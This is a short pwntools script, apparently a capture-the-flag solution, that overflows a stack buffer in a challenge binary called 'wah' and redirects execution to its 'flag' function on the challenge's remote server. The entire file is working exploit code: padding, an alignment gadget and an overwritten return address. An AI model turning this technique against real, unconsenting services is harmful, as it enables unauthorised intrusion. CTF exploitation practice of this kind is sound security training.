from pwn import *

binfile = "./wah"
context.binary = binfile
elf = ELF(binfile)

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]

flag = elf.symbols['flag']
HOST='challs.actf.co'
PORT=31224

# conn = process(binfile)
conn = remote(HOST, PORT)
conn.recvuntil('Cry:')
# padding + ret(8byte, allignment) + fun(=/bin/sh)

payload = b'A' * 40 + p64(ret) + p64(flag)

conn.sendline(payload)
conn.interactive()
